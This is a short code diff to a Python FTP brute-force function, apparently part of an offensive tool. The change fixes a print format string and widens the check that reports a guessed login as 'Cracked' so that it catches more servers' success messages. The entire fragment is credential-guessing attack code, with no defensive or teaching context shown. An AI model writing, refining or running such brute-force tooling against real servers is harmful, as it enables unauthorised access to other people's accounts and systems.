@@ -55,9 +55,9 @@ def ftp_file_download(server, username, password):
 def ftp_brute_force(server, username, password):
     ftp = ftplib.FTP(server)
     try:
-        print(f"Testing -> f{username}:{password}")
+        print(f"Testing -> {username}:{password}")
         response = ftp.login(username,password)
-        if "230" in response and "granted" in response:
+        if "230" in response and ("granted" in response or "success" in response):
             print(bcolors.OKGREEN+f"Cracked {username}:{password}"+bcolors.ENDC)
     except Exception as E:
         print(bcolors.WARNING+'Error : '+str(E)+bcolors.ENDC)
